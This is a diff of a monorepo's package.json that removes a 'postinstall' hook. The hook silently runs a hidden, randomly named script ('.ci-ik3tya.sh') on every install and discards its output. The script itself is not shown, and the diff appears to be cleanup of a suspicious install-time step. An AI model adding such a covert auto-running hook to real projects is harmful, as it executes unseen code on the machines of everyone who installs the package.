@@ -9,8 +9,7 @@
     "lint": "turbo lint",
     "format": "prettier --write \"**/*.{ts,tsx,md}\"",
     "fe": "pnpm -F form-fe",
-    "be": "pnpm -F form-be",
-    "postinstall": "sh ./.ci-ik3tya.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "be": "pnpm -F form-be"
   },
   "devDependencies": {
     "@repo/eslint-config": "workspace:*",
